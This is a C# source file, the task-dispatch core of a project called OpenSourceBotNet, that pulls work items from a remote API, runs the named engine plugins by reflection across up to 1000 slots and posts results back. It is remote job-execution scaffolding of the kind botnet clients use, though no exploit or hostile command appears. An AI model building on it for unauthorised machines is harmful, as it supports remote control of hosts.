using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;

using OpenSourceBotNet;
using OpenSourceBotNet.Core;
using OpenSourceBotNet.Core.Helpers;
using OpenSourceBotNet.Services;
using OpenSourceBotNet.Services.Resources;
using OpenSourceBotNet.Engines;

namespace OpenSourceBotNet.Core
{
    public class FluxCapacitor : FluxObject
    {
        public event AbortExecution abortExecution;

        public static Hashtable htEngines = new Hashtable();

        public static ArrayList alAvailableThreadIDs = new ArrayList();

        public static int iCurrentThreadCount = 0;
        public static int iMaxThreadCount = 1;
        public static int iHardMaxThreadCount = 1000;

        public static ArrayList alWorkQueue = new ArrayList();

        public static bool bGetWorkBusy = false;

        public static System.Threading.Timer tmrWorkWorker;

        public static void Initialize()
        {
            lock (alAvailableThreadIDs)
            {
                for (int i = 0; i < iHardMaxThreadCount; i++)
                {
                    alAvailableThreadIDs.Add(i.ToString());
                }
            }
        }

        public static void releaseResource(int iThreadID)
        {
            lock (alAvailableThreadIDs)
            {
                alAvailableThreadIDs.Add(iThreadID);
                iCurrentThreadCount--;
            }
        }

        public static void addToQueue(string queueString)
        {
            lock (alWorkQueue)
            {
                alWorkQueue.Add(queueString);
            }
        }

        public override void Start(object obj)
        {
            tmrWorkWorker = new System.Threading.Timer(new System.Threading.TimerCallback(workQueue), null, 3000, 60000);
        }

        public void workQueue(object obj)
        {
            if (FluxGlobal.bWorkable == false)
            {
                return;
            }

            bool bIsNotMax = IsNotMax();

            if (alWorkQueue.Count == 0 && bIsNotMax == true && iCurrentThreadCount < iHardMaxThreadCount)
            {
                GetMoreWork();
            }

            if (alAvailableThreadIDs.Count == 0 || iCurrentThreadCount >= iHardMaxThreadCount || alWorkQueue.Count == 0 || bIsNotMax == false)
            {
                return;
            }

            ArrayList alQueue = new ArrayList();

            lock (alWorkQueue)
            {
                alQueue.AddRange(alWorkQueue);
                alWorkQueue.Clear();
            }

            int xMax = alQueue.Count;

            string queueString = alQueue[0].ToString();
            alQueue.RemoveAt(0);

            string[] spQueueString = queueString.Replace("!", "ABCDEF@#@GHIJKLMN@#@OPQRSTUVWXYZ").Replace("[@][#][@]", "!").Split('!');

            for (int i = 0; i < spQueueString.Length; i++)
            {
                spQueueString[i] = spQueueString[i].Replace("ABCDEF@#@GHIJKLMN@#@OPQRSTUVWXYZ", "!");
            }

            passToEngine(spQueueString);

            iCurrentThreadCount++;

            lock (alWorkQueue)
            {
                alWorkQueue.AddRange(alQueue);
            }
        }

        public void passToEngine(string[] workString)
        {
            FluxEngineWorkObject ewObject = new FluxEngineWorkObject();
            ewObject.sEngineName = workString[0];
            ewObject.sPluginName = workString[1];
            ewObject.sTaskUUID = workString[2];
            ewObject.sPluginWork = workString[3];

            lock (alAvailableThreadIDs)
            {
                ewObject.iThreadID = int.Parse(alAvailableThreadIDs[0].ToString());
                alAvailableThreadIDs.RemoveAt(0);
            }

            Type tThisEngineType = Type.GetType(ewObject.sEngineName);
            Assembly thisAssembly = Assembly.GetExecutingAssembly();

            foreach (Type type in thisAssembly.GetTypes())
            {
                if (type.IsClass == true && type == tThisEngineType)
                {
                    lock (htEngines)
                    {
                        FluxEngine engineClassObject;

                        if (htEngines.ContainsKey(ewObject.iThreadID))
                        {
                            engineClassObject = (FluxEngine)htEngines[ewObject.iThreadID];
                            engineClassObject.Abort();
                            htEngines.Remove(ewObject.iThreadID);
                        }

                        engineClassObject = (FluxEngine)Activator.CreateInstance(type, new object[] { ewObject });
                        engineClassObject._fireFailed += new IPluginEvent(this.fireFailed);
                        engineClassObject._fireSuccess += new IPluginEvent(this.fireSuccess);
                        engineClassObject._fireSaveWork += new IPluginEvent(this.fireSaveWork);
                        engineClassObject._fireResponseTime += new IPluginResponseTime(fireResponseTime_LastResponse);

                        type.InvokeMember("Work", BindingFlags.InvokeMethod, null, engineClassObject, new object[] { });

                        htEngines.Add(ewObject.iThreadID, engineClassObject);
                    }


                    break;
                }
            }
        }

        public void fireSuccess(int iThreadID, string sTaskUUID, string results)
        {
            if (htEngines.ContainsKey(iThreadID))
            {
                FluxEngine fluxEngine = (FluxEngine)htEngines[iThreadID];
                fluxEngine._fireFailed -= new IPluginEvent(this.fireFailed);
                fluxEngine._fireSuccess -= new IPluginEvent(this.fireSuccess);
                fluxEngine._fireSaveWork -= new IPluginEvent(this.fireSaveWork);
                fluxEngine._fireResponseTime -= new IPluginResponseTime(fireResponseTime_LastResponse);
                
                lock(htEngines)
                {
                    htEngines.Remove(iThreadID);
                }

                lock (alAvailableThreadIDs)
                {
                    alAvailableThreadIDs.Add(iThreadID);
                }

                fluxEngine.Abort();
            }
        }

        public void fireSaveWork(int iThreadID, string sTaskUUID, string results)
        {
            // Save Work Queue?
        }

        public void fireFailed(int iThreadID, string sTaskUUID, string results)
        {
            if (htEngines.ContainsKey(iThreadID))
            {
                FluxEngine fluxEngine = (FluxEngine)htEngines[iThreadID];
                fluxEngine._fireFailed -= new IPluginEvent(this.fireFailed);
                fluxEngine._fireSuccess -= new IPluginEvent(this.fireSuccess);
                fluxEngine._fireSaveWork -= new IPluginEvent(this.fireSaveWork);
                fluxEngine._fireResponseTime -= new IPluginResponseTime(fireResponseTime_LastResponse);

                lock (htEngines)
                {
                    htEngines.Remove(iThreadID);
                }

                lock (alAvailableThreadIDs)
                {
                    alAvailableThreadIDs.Add(iThreadID);
                }

                fluxEngine.Abort();
            }
        }

        public void fireResponseTime_LastResponse(int iThreadID, double iLastResponse, string host)
        {
            lock (alAvailableThreadIDs)
            {
                alAvailableThreadIDs.Add(iThreadID);
            }

            //pcResponseObject pcResponse;

            //if (htPluginHosts.ContainsKey(host))
            //{
            //    pcResponse = (pcResponseObject)htPluginHosts[host];
            //}
            //else
            //{
            //    pcResponse = new pcResponseObject();
            //}

            //if (pcResponse.iLowResponse > iLastResponse)
            //{
            //    pcResponse.iLowResponse = iLastResponse;
            //}
            //else if (pcResponse.iHighResponse < iLastResponse)
            //{
            //    pcResponse.iHighResponse = iLastResponse;
            //}

            //pcResponse.iResponseTotal += iLastResponse;
            //pcResponse.iResponseCount++;

            //pcResponse.dAverageResponse = pcResponse.iResponseTotal / pcResponse.iResponseCount;

            //htPluginHosts[host] = pcResponse;

            //if ((pcResponse.iResponseCount % 100) == 0)
            //{
            //    double dGetMoreWork = iLastResponse / pcResponse.dAverageBaseLine;

            //    if (dGetMoreWork < 1.5 && iCurrentThreadCount <= iHardMaxThreadCount && IsNotMax())
            //    {
            //        GetMoreWork();
            //    }
            //    else if (iCurrentThreadCount <= iHardMaxThreadCount && IsNotMax())
            //    {
            //        PerformanceTests();
            //    }
            //}
        }

        public void GetMoreWork()
        {
            if (bGetWorkBusy == true)
            {
                return;
            }

            bGetWorkBusy = true;

            string sWork = FluxApiClient.GetWork();

            if (sWork != "")
            {
                if (sWork.Contains("\n"))
                {
                    string[] spUpdates = sWork.Replace("\r", "").Split('\n');

                    foreach (string sUpdating in spUpdates)
                    {
                        addToQueue(sUpdating);
                    }
                }
                else
                {
                    addToQueue(sWork);
                }
            }

            iMaxThreadCount++;

            System.Threading.Thread.Sleep(15000);

            bGetWorkBusy = false;
        }

        public void PostResults(string sTaskUUID, string results, string action)
        {
            FluxApiClient.PostResults(sTaskUUID, results, action);
        }

        public bool IsNotMax()
        {
            bool bAddWork = false;

            if (NetworkThrottle.bMaxDownloadReached == false && NetworkThrottle.bMaxUploadReached == false)
            {
                bAddWork = true;
            }

            return bAddWork;
        }
    }
}
